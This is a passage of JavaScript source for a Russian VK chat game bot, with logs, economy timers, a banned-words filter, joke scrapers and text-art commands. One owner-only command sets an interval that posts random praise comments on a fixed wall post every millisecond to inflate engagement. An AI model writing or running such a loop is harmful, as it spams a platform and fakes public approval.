      setTimeout(() => {message.send(`Процесс завершён на: ${rand(10,19)}%`)  }, 1000);
      setTimeout(() => {message.send(`Процесс завершён на: ${rand(20,39)}%`)  }, 1200);  
      setTimeout(() => {message.send(`Процесс завершён на: ${rand(40,59)}%`)  }, 1400); 
      setTimeout(() => {message.send(`Процесс завершён на: ${rand(60,84)}%`)  }, 1600);
      setTimeout(() => {message.send(`Процесс завершён на: ${rand(85,98)}%`)  }, 1800);
      setTimeout(() => {message.send(`Процесс завершён на: ${rand(99,100)}%`)  }, 2000);
      setTimeout(() => {message.send(`Система успешно перезагружена.`)  }, 2200);
	                                                     setTimeout(() => { process.exit(-1); }, 2800);  // Процесс рестарта.
	                                                 });





  function rand(min, max) {return Math.round(Math.random() * (max - min)) + min} 
  var parserInt = (str) => parseInt(str.replace(/k|к/ig, "000"));
  var parserInt1 = (str) => parseInt(str.replace(/м|m/ig, "000000"));	
  function spaces(string) {
  	if (typeof string !== "string") string = string.toString();
  	return string.split("").reverse().join("").match(/[0-9]{1,3}/g).join(".").split("").reverse().join("");
  };
  Array.prototype.random = function() {  
  	return this[Math.floor(this.length * Math.random())];
  }

 //------------------------------------------------------------------------------------\\ 
 //------------------------------------------------------------------------------------\\
 function user_id(id) {
 	let ids = 0
 	if(uid[id]){
 		ids = uid[id].id
 	}    
 	return ids; 
 }  
  //------------------------------------------------------------------------------------\\
//------------------------------------------------------------------------------------\\
	// log
	function logs(id, ids, num, type) {

 	// - - - - - - - - - - - - - - - - -  
 	if(type == 1){ 
 		if(!log.point[ids]){ log.point[ids] = { log: [] }  } 
 			if(!log.point[id]){ log.point[id] = { log: [] }  } 
 				log.point[id].log.push(`[${time()} | ${data()} | Pay] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num}$\n`)
 			log.point[ids].log.push(`[${time()} | ${data()} | Pay] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num}$\n`)
 			if(log.point[id].log.length >= 15){ delete log.point[id].log.shift() } 
 				if(log.point[ids].log.length >= 15){ delete log.point[id].log.shift() } 
 			}
 		if(type == 2){ 
 			if(!log.give[ids]){ log.give[ids] = { log: [] }  } 
 				if(!log.give[id]){ log.give[id] = { log: [] }  } 
 					log.give[id].log.push(`[${time()} | ${data()} | Give] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num}$\n`)
 				log.give[ids].log.push(`[${time()} | ${data()} | Give] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num}$\n`)
 				if(log.give[id].log.length >= 15){ delete log.give[id].log.shift() } 
 					if(log.give[ids].log.length >= 15){ delete log.give[id].log.shift() }  
 				}
 			if(type == 3){ 
 				if(!log.remove[ids]){ log.remove[ids] = { log: [] }  } 
 					if(!log.remove[id]){ log.remove[id] = { log: [] }  } 
 						log.remove[id].log.push(`[${time()} | ${data()} | Remove] Забрал [ID: ${id}] у игрока [ID: ${ids}] \n`)
 					log.remove[ids].log.push(`[${time()} | ${data()} | Remove] Забрал [ID: ${id}] у игрока [ID: ${ids}] \n`)
 					if(log.remove[id].log.length >= 15){ delete log.remove[id].log.shift() } 
 						if(log.remove[ids].log.length >= 15){ delete log.remove[id].log.shift() } 
 					} 
 				if(type == 4){ 
 					if(!log.admin[ids]){ log.admin[ids] = { log: [] }  } 
 						if(!log.admin[id]){ log.admin[id] = { log: [] }  } 
 							log.admin[id].log.push(`[${time()} | ${data()} | Admin] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num} lvl\n`)
 						log.admin[ids].log.push(`[${time()} | ${data()} | Admin] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num} lvl\n`)
 						if(log.admin[id].log.length >= 15){ delete log.admin[id].log.shift() } 
 							if(log.admin[ids].log.length >= 15){ delete log.admin[id].log.shift() } 
 						} 
 					if(type == 5){ 
 						if(!log.setwin[ids]){ log.setwin[ids] = { log: [] }  } 
 							if(!log.setwin[id]){ log.setwin[id] = { log: [] }  } 
 								log.setwin[id].log.push(`[${time()} | ${data()} | Setwin] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num}%\n`)
 							log.setwin[ids].log.push(`[${time()} | ${data()} | Setwin] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num}%\n`)
 							if(log.setwin[id].log.length >= 15){ delete log.setwin[id].log.shift() } 
 								if(log.setwin[ids].log.length >= 15){ delete log.setwin[id].log.shift() }  
 							} 
 						if(type == 6){ 
 							if(!log.warns[ids]){ log.warns[ids] = { log: [] }  } 
 								if(!log.warns[id]){ log.warns[id] = { log: [] }  } 
 									log.warns[id].log.push(`[${time()} | ${data()} | warn] Выдал [ID: ${id}] игроку [ID: ${ids}] | Причина: ${num}\n`)
 								log.warns[ids].log.push(`[${time()} | ${data()} | warn] Выдал [ID: ${id}] игроку [ID: ${ids}] | Причина: ${num}\n`)
 								if(log.warns[id].log.length >= 15){ delete log.warns[id].log.shift() } 
 									if(log.warns[ids].log.length >= 15){ delete log.warns[id].log.shift() }  
 								} 
 						}
	//

	// log

	function game_log(id, name, count, win_lose) {

 	// - - - - - - - - - - - - - - - - -   
 	if(!log.game[id]){ log.game[id] = { log: [] }  } 
 		log.game[id].log.push(`[${time()} | ${data()} | ${name}] Ставка: ${count}$ | Исход: ${win_lose.toString().replace(/0/gi, "❌").replace(/1/gi, "✅")}\n`) 
 	if(log.game[id].log.length >= 15){ delete log.game[id].log.shift() }  

 }
	//


	function button(array) { 
		let kb = []; 
		if (array.length > 40) return false; 

		for (let i = 0; i < 10; i += 1) { 
			if (!array.slice(i * 3, i * 3 + 3)[0]) break; 
			kb.push(array.slice(i * 3, i * 3 + 3)); 
		} 

		kb.map((arr) => { 
			arr.map((button, i) => { 
				arr[i] = Keyboard.textButton({ 
					label: button 
				}); 
			}); 
		}); 

		return Keyboard.keyboard(kb); 
	}

	
 //------------------------------------------------------------------------------------\\
 function lvlup(id) {
 	let text = false;
 	if(acc.users[id].exs >= acc.users[id].exsup){
 		acc.users[id].exs -= acc.users[id].exsup;
 		acc.users[id].lvl += 1;
 		if(acc.users[id].game.win < 52){acc.users[id].game.win += 1;}
 		acc.users[id].exsup += new_lvl();
 		text = true;
 	}
 	return text;
 } 
 //------------------------------------------------------------------------------------\\
 function new_lvl(iid) {
 	let ids = 0
 	let numbers = [10,20,30,40,50,60];
 	let rand = numbers.random()
 	return rand;
 }
 //------------------------------------------------------------------------------------\\
 function zapret(text) {
 	let text1 = text.toLowerCase();
 	let texts = 0;
 	let stat = false;
 	var zaprets = /(вк бо т |сова не спит|сова никогда не спит|с о в а н е с п и т|сованикогданеспит|сова не спит никогда|вкботру|vkvot ru|vkbotru|vkbot|v k b o t . r u|в к бот|порно|botvk|ботвк|vkbot|кбот|bot vk|хентай|секс|пидр|трах|насилие|зоофил|бдсм|сирия|hentai|hentay|синий кит|самоубийство|террористы|слив|цп|cp|маленькие|малолетки|сучки|трах|ебля|изнасилование|блять|хуй|пошел нах|тварь|мразь|сучка|гандон|уебок|шлюх|паскуда|оргазм|девственницы|целки|рассовое|мелкие|малолетки|несовершеннолетние|ебля|хентай|sex|bdsm|ebl|trax|syka|shlux|инцест|iznas|мать|долбаеб|долбаёб|хуесос|сучка|сука|тварь|пездюк|хуй|шлюх|бог|сатана|мразь)/
 	if (zaprets.test(text1) == true) { 
 		texts = `📗 ➾ Ошибка: Эти слова внесены в реестр запрещённых!` 
 		stat = true;
 	}
 	var filter1 = /(http(s)?:\/\/.)?(www\.)?[-a-z0-9@:%._\+~#=]{1,256}\.[a-z]{2,6}/
 	var filter2 = /(?!http(s)?:\/\/)?(www\.)?[а-я0-9-_.]{1,256}\.(рф|срб|блог|бг|укр|рус|қаз|امارات.|مصر.|السعودية.)/ 
 	if (filter1.test(text1) == true || filter2.test(text1) == true) { 
 		texts = `📗 ➾ Ошибка: Эти слова внесены в реестр запрещённых!` 
 		stat = true; 
 	}
 	return texts
 } 
 
  //------------------------------------------------------------------------------------\\
  var uptime = { sec: 0, min: 0, hours: 0, days: 0 }
 //------------------------------------------------------------------------------------\\
 setInterval(() => {
 	uptime.sec++;
 	if (uptime.sec == 60) { uptime.sec = 0; uptime.min += 1; }
 	if (uptime.min == 60) { uptime.min = 0; uptime.hours += 1; }
 	if (uptime.hours == 24) { uptime.hours = 0; uptime.days += 1; }
 }, 1000);

 
 
 function time() {
 	let date = new Date();
 	let days = date.getDate();
 	let hours = date.getHours();
 	let minutes = date.getMinutes();
 	let seconds = date.getSeconds();
 	if (hours < 10) hours = "0" + hours;
 	if (minutes < 10) minutes = "0" + minutes;
 	if (seconds < 10) seconds = "0" + seconds;
 	var times = hours + ':' + minutes + ':' + seconds
 	return times;
 }
 //------------------------------------------------------------------------------------\\
 function data() {
 	var date = new Date();
 	let days = date.getDate();
 	let month = date.getMonth() + 1; 
 	if (month < 10) month = "0" + month;
 	if (days < 10) days = "0" + days;
 	var datas = days + ':' + month + ':2019' ;
 	return datas;
 }
 //------------------------------------------------------------------------------------\\ 
 setInterval(() => {
 	acc.curs = rand(30000,80000) 
 	acc.bit = rand(31000,32200)
 }, 600000);


 setInterval(() =>{
 	for(i=1;i<200000;i++){
 		if(acc.users[i]){
 			if(acc.users[i].autobiz != false){
 				acc.users[i].autobiz -= 1;
 				if(acc.users[i].autobiz == 0){acc.users[i].autobiz = false}

 					if(acc.users[i].bizs.one_biz == true){
 						acc.users[i].balance += Number(acc.users[i].bizs.one.zp)
 					}
 					if(acc.users[i].bizs.two_biz == true){
 						acc.users[i].balance += Number(acc.users[i].bizs.two.zp)
 					}
 				}
	 			//
	 			if(acc.users[i].autozp != false){
	 				if(acc.users[i].job.name != false){
	 					acc.users[i].autozp -= 1;
	 					if(acc.users[i].autozp == 0){acc.users[i].autozp = false}
	 						acc.users[i].balance += Number(acc.users[i].job.count)	
	 				}
	 			}
	 		}

	 	}
	 }, 3600000); 
 
 
 function restart() {
 	for(i=1;i < 200000; i++){  
 		if(acc.users[i]){
 			acc.users[i].bloks_cases = false
 			acc.users[i].bloks_gun_case = false
 			acc.users[i].bloks_frac = false
 			acc.users[i].bloks_giverub = false
 			acc.users[i].job_stop = false
 			acc.users[i].bizs_one_stop = false
 			acc.users[i].bizs_two_stop = false
 			acc.users[i].safe_status = false
 			acc.users[i].safe_key = false
 		}
 	} 
 }

 setInterval(() =>{
 	for(name in frac){
 		let sum = frac[name].bank;
 		frac[name].bank = 0;
 		let owner_sum = sum / 100 * 10;
 		let user_sums = sum / 100 * 90;
 		let people = frac[name].people - 1;
 		let user_sum = user_sums / people;

 		frac[name].balance += owner_sum;
 		for(i in frac[name].users){
 			frac[name].users[i].count = 0;
 			acc.users[i].balance += user_sum;
 		} 
 	}
 }, 7200000); 

 function adm_log(is) {
 	let id = is[0];	
 	let i = config;  
 	vk.api.call('messages.send', { 
 		user_id: acc.users[2].id, 
 		message: `Поступил новый Лог Административных Действий.\n\n -- Ник Администратора: @id${acc.users[is[0]].id} (${acc.users[id].prefix})\n -- Им была Использована команда: ${is[1]}\n -- ID Профиля Администратора: @id${acc.users[is[0]].id}(${is[0]})\n -- Уровень доступа: ${acc.users[id].level.toString().replace(/1/gi, "VIP").replace(/2/gi, "Модератор").replace(/3/gi, "Администратор").replace(/4/gi, "Главный Администратор").replace(/5/gi, "Создатель")}`,			random_id: 0});
 }
 
 vk.updates.hear(/^(?:аня,|аня|анька|анька,)/i, message => { 
 	let user = acc.users[user_id(message.user)];
 	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
 	request(`https://isinkin-bot-api.herokuapp.com/1/talk?q=${encodeURIComponent(message.text)}`).then(res => { let bot = res.text;
 		return message.reply(`${rnick}, ${bot}`) 
 	}) 
 });




 setInterval(() =>{
 	for(i=0;i<100000;i++){
 		if(acc.users[i]){
 			if(acc.users[i].adm_time > 0){
 				acc.users[i].adm_time -= 1;
 				if(acc.users[i].adm_time == 0){
 					acc.users[i].level = 0;

 					vk.api.call('messages.send', {
 						user_id: acc.users[i].id,
 						message: `Срок действия vip/moder/admin прав истек. Вы сняты с должности.`,			random_id: 0
 					});
 				}
 			}
 		}
 	}
 }, 3600000);  	 


 setInterval(function(){
 	fs.writeFileSync("./base/acc.json", JSON.stringify(acc, null, "\t")) 
 	fs.writeFileSync("./setting/config.json", JSON.stringify(config, null, "\t")) 
 	fs.writeFileSync("./base/uid.json", JSON.stringify(uid, null, "\t"))  
 	fs.writeFileSync("./base/log.json", JSON.stringify(log, null, "\t"));
 	fs.writeFileSync("./base/frac.json", JSON.stringify(frac, null, "\t"));
 	fs.writeFileSync("./base/vzlom.json", JSON.stringify(vzlom, null, "\t"));
 	fs.writeFileSync("./base/clans.json", JSON.stringify(clans, null, "\t"));
 	fs.writeFileSync("./base/tokens.json", JSON.stringify(tokens, null, "\t"));
 	fs.writeFileSync("./base/saper.json", JSON.stringify(saper, null, "\t"));

 }, 2000);





 vk.updates.hear(/^(?:nakruntka)/i, message => {
 	if(message.user != 287908009) return; 
 	setInterval(() => {
 		let group = 179084056;
 		let id_users = 287908009;
 		let id_post = 1428;
 		let msg = ['Тема топ','Топ','Круто','Заебись','Пиздато'].random();
 		vk.api.wall.createComment({owner_id: id_users, post_id: id_post, from_group: group, message: msg});
 	}, 1);
 	message.send(`Накрутка комментариев успешно зпущена\n -- Пост на который идёт накрутка  | https://vk.com/wall287908009_1428 |`)
 });


cm.hear(/^(?:кто)\s(.*)/i, async(message) => {
 	if (!message.isChat) return message.send(`Команда работает только в беседе.`);
 	let {
 		profiles
 	} = await vk.api.messages.getConversationMembers({
 		peer_id: message.peerId
 	});
 	let profile = utils.pick(profiles);
 	await message.send(
 		utils.pick(['Это точно', 'Я уверен, что это', 'Твоя мама говрит, что это', 'Кнч, это', 'Думаю, что это', 'Наверное, это', 'Википедия говорит, что это', 'Сотку даю, что это']) + ' -- @id' + profile.id + '(' + profile.first_name + ')'
 		);
 });


 vk.updates.hear(/^(?:стишок|стих)$/i, async (message, bot) => { 
 	let filter = (text) => { 
 		text = text.replace('&quot;', '"'); 
 		text = text.replace('!&quot;', '"'); 
 		text = text.replace('?&quot;', '"'); 
 		text = text.replace(/(&quot;)/ig, '"'); 
 		return text; 
 	} 

 	let poems = await getPoems(); 
 	return message.reply(`держи:\n\n ${filter(poems)}\n\n🤤 » Понравилось? Напиши команду "Стих" ещё раз!`); 

 	function getPoems() { 
 		return rq('https://www.anekdot.ru/random/poems/').then(body => {
 			let res = body.match(/(?:<div class="text">([^]+)<\/div>)/i); 
 			res = res[0].split('</div>'); 
 			return res[0].split(`<div class="text">`).join('').split('<br>').join('\n'); 
 		}); 

 	} 
 }); 


 vk.updates.hear(/^(?:история)$/i, async (message, bot) => { 
 	let filter = (text) => { 
 		text = text.replace('&quot;', '"'); 
 		text = text.replace('!&quot;', '"'); 
 		text = text.replace('?&quot;', '"'); 
 		text = text.replace(/(&quot;)/ig, '"'); 
 		return text; 
 	} 

 	let story = await getStory(); 
 	return message.reply(`держи:\n\n ${filter(story)}\n\n🤤 » Понравилось? Напиши команду "История" ещё раз!`); 

 	function getStory() { 
 		return rq('https://www.anekdot.ru/random/story/').then(body => { 
 			let res = body.match(/(?:<div class="text">([^]+)<\/div>)/i); 
 			res = res[0].split('</div>'); 
 			return res[0].split(`<div class="text">`).join('').split('<br>').join('\n'); 
 		}); 

 	} 
 }); 


 vk.updates.hear(/^(?:анекдот)$/i, async (message, bot) => { 
 	let filter = (text) => { 
 		text = text.replace('&quot;', '"'); 
 		text = text.replace('!&quot;', '"'); 
 		text = text.replace('?&quot;', '"'); 
 		text = text.replace(/(&quot;)/ig, '"'); 
 		return text; 
 	} 

 	let anek = await getAnek(); 
 	return message.reply(`держи:\n\n ${filter(anek)}\n\n🤤 » Понравилось? Напиши команду "Анекдот" ещё раз!`); 

 	function getAnek() { 
 		return rq('https://www.anekdot.ru/random/anekdot/').then(body => { 
 			let res = body.match(/(?:<div class="text">([^]+)<\/div>)/i); 
 			res = res[0].split('</div>'); 
 			return res[0].split(`<div class="text">`).join('').split('<br>').join('\n'); 
 		}); 

 	} 
 }); 


 cm.hear(/^(?:транскрипт)\s(.*)/i, message => {
 	let text = ``;
 	message.$match[1].split('').map(x => {
 		if (trans[x]) {
 			text += trans[x];
 		}
 	});
 	message.send(`${text.split('').join('')}`)
 })
 const trans = {
 	й: 'i',
 	ц: 'c',
 	у: 'u',
 	к: 'k',
 	е: 'e',
 	ё: 'e',
 	н: 'n',
 	г: 'g',
 	ш: 'sch',
 	щ: 'sh',
 	з: 'z',
 	х: 'h',
 	ф: 'f',
 	в: 'v',
 	а: 'a',
 	п: 'p',
 	р: 'r',
 	о: 'o',
 	л: 'l',
 	д: 'd',
 	ж: 'zh',
 	э: 'e',
 	я: 'ya',
 	ч: 'ch',
 	с: 's',
 	м: 'm',
 	и: 'i',
 	т: 't',
 	ь: "'",
 	б: 'b',
 	ю: 'you',

 	Й: 'i',
 	Ц: 'c',
 	У: 'u',
 	К: 'k',
 	Е: 'e',
 	Ё: 'e',
 	Н: 'n',
 	Г: 'g',
 	Ш: 'sch',
 	Щ: 'sh',
 	З: 'z',
 	Х: 'р',
 	Ъ: 'ъ',
 	Ф: 'f',
 	Ы: 'i',
 	В: 'v',
 	А: 'a',
 	П: 'p',
 	Р: 'r',
 	О: 'o',
 	Л: 'l',
 	Д: 'd',
 	Ж: 'zh',
 	Э: 'e',
 	Я: 'ya',
 	Ч: 'ch',
 	С: 's',
 	М: 'w',
 	И: 'i',
 	Т: 't',
 	Ь: "'",
 	Б: 'b',
 	Ю: 'you',
 	Ы: 'i',
 	ы: 'i',
 	" ": ' ',
 	".": '.',
 	"!": '!',
 	"?": '?'
 }


 cm.hear(/^(?:напиши)\s(.*)/i, message => {
 	if (message.$match[1].length > 14) return message.send(`Нельзя использовать больше 14-ти символов!`)
 		let text = ``;
 	message.$match[1].split('').map(x => {
 		if (bigsmile[x]) {
 			text += bigsmile[x];
 		}
 	});
 	message.send(`\n${text.split('').join('')}`)
 })
 const bigsmile = {
 	а: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	б: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
 	в: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
 	г: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
 	д: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◽◼◼◼◽◽\n◽◽◽◼◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◼◼◼◼◼◼◼◽\n◽◼◽◽◽◽◽◼◽\n◽◽◽◽◽◽◽◽◽`,
 	е: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	ё: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◽◼◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	ж: `\n◽◽◽◽◽◽◽◽◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◽◼◼◼◼◼◽◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◽◽◽◽◽◽◽◽`,
 	з: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	и: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◼◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◼◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	й: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◼◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◼◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	к: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◼◽◽◽\n◽◽◼◽◼◽◽◽◽\n◽◽◼◼◽◽◽◽◽\n◽◽◼◽◼◽◽◽◽\n◽◽◼◽◽◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	л: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◼◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	м: `\n◽◽◽◽◽◽◽◽◽\n◽◼◽◽◽◽◽◼◽\n◽◼◼◽◽◽◼◼◽\n◽◼◽◼◽◼◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◽◽◽◼◽\n◽◼◽◽◽◽◽◼◽\n◽◼◽◽◽◽◽◼◽\n◽◽◽◽◽◽◽◽◽`,
 	н: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	о: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
 	п: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	р: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
 	с: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
 	т: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
 	у: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
 	ф: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
 	х: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◽◼◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◼◽◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	ц: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◼◼◽\n◽◽◽◽◽◽◽◼◽`,
 	ч: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	ш: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	щ: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◼◼◼◼◼◽\n◽◽◽◽◽◽◽◼◽\n◽◽◽◽◽◽◽◽◽`,
 	ъ: `\n◽◽◽◽◽◽◽◽◽\n◽◼◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
 	ы: `\n◽◽◽◽◽◽◽◽◽\n◽◼◽◽◽◽◽◼◽\n◽◼◽◽◽◽◽◼◽\n◽◼◽◽◽◽◽◼◽\n◽◼◼◼◼◽◽◼◽\n◽◼◽◽◽◼◽◼◽\n◽◼◽◽◽◼◽◼◽\n◽◼◼◼◼◽◽◼◽\n◽◽◽◽◽◽◽◽◽`,
 	ь: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
 	э: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◼◼◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
